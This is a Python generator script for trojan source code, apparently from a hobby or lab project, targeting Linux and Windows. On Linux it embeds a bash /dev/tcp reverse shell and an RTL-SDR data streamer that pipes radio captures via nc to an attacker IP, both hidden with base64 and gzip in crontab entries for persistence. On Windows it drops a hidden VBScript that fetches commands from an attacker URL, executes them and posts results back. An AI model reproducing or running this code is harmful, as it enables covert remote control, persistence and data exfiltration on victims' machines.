#!/usr/bin/env python3

from base64 import b64encode as b64
import argparse
import gzip

parser = argparse.ArgumentParser(description='Create Payload')
parser.add_argument('-i','--rev_shell_ip', help='IP to reverse shell to')
parser.add_argument('-p','--rev_shell_port',help='PORT to reverse shell to')
parser.add_argument('-P','--sdr_port',help='PORT to send SDR data to')
parser.add_argument('-o','--output_dir',help='output directory')
parser.add_argument('-t','--target_os',help='target os to build trojan for')
args = parser.parse_args()

if args.rev_shell_ip == None:
    args.rev_shell_ip = '192.168.0.1'

if args.rev_shell_port == None:
    args.rev_shell_port = '9999'

if args.sdr_port == None:
    args.sdr_port = '4444'

if args.target_os == None:
    args.target_os = 'linux'

if args.target_os == 'linux':
    #https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/
    reverse_shell_exp = '''echo "YOUR MACHINE IS VULNERABLE\n" > ~/exp.txt && bash -i >& /dev/tcp/{}/{} 0>&1'''
    #sdr_comm_exploit = '''#! /bin/bash
    #rtl_sdr -f 1000000 - | nc {} {} '''

    sdr_comm_exploit = '''import os
import signal
import subprocess
import socket

IP = "'''+args.rev_shell_ip+'''"
PORT = 4446
freq = 1000000
sdr_port = "'''+args.sdr_port+'''"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP,PORT))

pro = subprocess.Popen('rtl_sdr -f {} - | nc {} {}'.format(freq,IP,sdr_port),shell=True,preexec_fn=os.setsid)
while True:
    freq_ = s.recv(1024).decode().strip()
    if freq_ == 'exit':
        exit()
    if freq_.isdigit():
        freq = int(freq)
        os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
        pro = subprocess.Popen('rtl_sdr -f {}  - | nc {} {}'.format(freq,IP,sdr_port),shell=True,preexec_fn=os.setsid)

os.killpg(os.getpgid(pro.pid), signal.SIGTERM)

    '''
    run_all_exploits = '''#! /bin/bash
    IN=$(crontab -l | grep -E '53 23 31 2 3 [a-zA-Z0-9+/=]+' | cut -d ' ' -f 6)

    function sec_since_midnight() {
        local today="$(date +'%F')"
        local now=$(date +'%s')
        local midnight=$(date -d "${today} 0" +%s)
        echo "$((${now} - ${midnight}))"
    }

    sec=$(sec_since_midnight)

    if [[ $sec == $sec ]]; then
      IN2=$(crontab -l | grep -E '53 23 31 2 3 [a-zA-Z0-9+/=]+' | cut -d ' ' -f 6)
      cmd=$(echo $IN2 | base64 -d | cut -d ';' -f 1)
      $(/bin/bash -c "$cmd")
    fi

    if [[ $sec == $sec ]]; then
      IN2=$(crontab -l | grep -E '54 23 31 2 3 [a-zA-Z0-9+/=]+' | cut -d ' ' -f 6)
      $(echo $IN2 | base64 -d | gunzip -c | base64 -d | cut -d ';' -f 1 > /tmp/util.py)
      $(python3 /tmp/util.py)
    fi
    '''

    reverse_shell_exp = reverse_shell_exp.format(args.rev_shell_ip,args.rev_shell_port).encode()
    sdr_comm_exploit = sdr_comm_exploit.encode()#.format(args.sdr_ip,args.sdr_port).encode()
    run_all_exploits = run_all_exploits.encode()

    rs_exp = b64(reverse_shell_exp).decode()
    sd_exp = b64(sdr_comm_exploit)
    sd_exp = b64(gzip.compress(sd_exp)).decode()
    al_exp = b64(run_all_exploits)
    al_exp = b64(gzip.compress(al_exp)).decode()


    code = '''#include <iostream>
#include "exploit_help.h"
#include <memory>
#include <fstream>

int main(int argc, char const *argv[]) {
  auto system = std::make_unique<exploit>();
  std::ofstream fout;
  std::string payload = "* * * * * (/bin/bash -c \\\"printf \\\\%s \\\\\\"\\\\$(printf \''''+al_exp+'''\'|base64 -d | gunzip -c | base64 -d)\\\\\\"|\\\\${!#}\\")\\n";
  fout.open("/tmp/backup");
  fout << payload;
  fout.close();
  system->crontab_add("crontab /tmp/backup");
  system->crontab_add("crontab -l | { cat; echo \\"53 23 31 2 3 '''+rs_exp+'''\\"; } | crontab -");
  system->crontab_add("crontab -l | { cat; echo \\"54 23 31 2 3 '''+sd_exp+'''\\"; } | crontab -");
  system->crontab_add("rm /tmp/backup");
  system->crontab_l();
  //system->DisplayOutput();
  return 0;
}
    '''

elif args.target_os == 'windows':
    #Add exploit here
    payload = '''" \\n\\
Option Explicit \\n\\
On Error Resume Next \\n\\
CONST callbackUrl = \\"http://'''+args.rev_shell_ip+''':80/\\" \\n\\
Dim xmlHttpReq, shell, execObj, command, break, result \\n\\
Set shell = CreateObject(\\"WScript.Shell\\") \\n\\
break = False \\n\\
While break <> True \\n\\
Set xmlHttpReq = WScript.CreateObject(\\"MSXML2.ServerXMLHTTP\\") \\n\\
xmlHttpReq.Open \\"GET\\", callbackUrl, false \\n\\
xmlHttpReq.Send \\n\\
command = \\"cmd /c \\" & Trim(xmlHttpReq.responseText) \\n\\
If InStr(command, \\"EXIT\\") Then \\n\\
    break = True \\n\\
Else \\n\\
    Set execObj = shell.Exec(command) \\n\\
    result = \\"\\" \\n\\
    Do Until execObj.StdOut.AtEndOfStream \\n\\
        result = result & execObj.StdOut.ReadAll() \\n\\
    Loop \\n\\
    Set xmlHttpReq = WScript.CreateObject(\\"MSXML2.ServerXMLHTTP\\") \\n\\
    xmlHttpReq.Open \\"POST\\", callbackUrl, false \\n\\
    xmlHttpReq.Send(result) \\n\\
End If \\n\\
Wend";'''
    code = '''
    #include <iostream>
    #include <fstream>
    #include <windows.h>
    #include "exploit_help.h"
    #include <memory>
    int main(int argc, char const *argv[]) {
       auto system = std::make_unique<exploit>();
       std::string code = '''+payload+'''
       std::ofstream MyFile(".\\\\util.vbs");
       MyFile << code;
       MyFile.close();
       DWORD attributes = GetFileAttributes("util.vbs");
       SetFileAttributes("MyFile.txt", attributes + FILE_ATTRIBUTE_HIDDEN);
       system->crontab_add("start util.vbs");
       //system->crontab_add("del util.vbs");
       return 0;
    }
    '''

with open(args.output_dir+'/virus.cpp','w') as f:
    f.write(code)

with open(args.output_dir+'/win.py','r') as f:
    code = f.read()
code = code.format(args.sdr_port,args.rev_shell_ip)

with open(args.output_dir+'/sdr_win.py','w') as f:
    f.write(code)

#print(b64(reverse_shell_exp).decode(),b64(sdr_comm_exploit).decode(),b64(run_all_exploits).decode())
